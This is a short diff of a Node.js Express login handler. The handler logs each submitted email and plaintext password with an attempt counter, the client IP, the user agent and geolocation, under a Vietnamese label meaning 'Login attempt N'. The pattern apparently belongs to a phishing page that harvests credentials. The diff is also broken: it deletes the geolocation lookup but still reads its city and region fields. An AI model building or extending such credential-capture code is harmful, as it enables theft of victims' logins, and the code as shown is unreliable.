@@ -128,11 +128,12 @@ app.get('/login', (req, res) => {
 // Handle login submission
 app.post('/login',async (req, res) => {
   const { email, pass, attempts } = req.body;
-  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+  const ip = getClientIP(req);
+  const userAgent = req.headers['user-agent'] || 'N/A';
 
-  const geo = await getGeo(ip);
+  console.log("IP:", ip);
+  console.log("User-Agent:", userAgent);
 
-  const userAgent = req.headers['user-agent'];
   logData({ type: `Đăng Nhập Lần ${attempts} - Email  ${email}`, email, pass, ip, attempt: attempts,ip    , userAgent,
     city: geo.city,
     region: geo.region,
